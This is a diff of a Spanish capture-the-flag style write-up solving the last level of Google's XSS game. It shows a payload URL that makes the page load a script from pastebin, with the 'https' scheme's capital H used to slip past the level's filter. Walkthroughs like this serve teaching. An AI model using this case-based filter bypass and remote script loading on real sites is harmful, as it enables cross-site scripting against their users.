@@ -60,7 +60,7 @@ Y tenemos la siguiente URL completa para pasarsela al navegador:
 
 Ahora quedaría de esta forma (modificamos la **H** del principio del **https** a **MAYUSCULAS** así **Https**:
 
-``` https://xss-game.appspot.com/level6/frame#Https://pastebin.com/raw/ny1kd5mC```
+``` https://xss-game.appspot.com/level6/frame#Https://pastebin.com/raw/ny1kd5mC ```
 
 Nos muestra un cuadre de texto indicando que hemos pasado de nivel y completado el Juego de XSS de Google :)
 
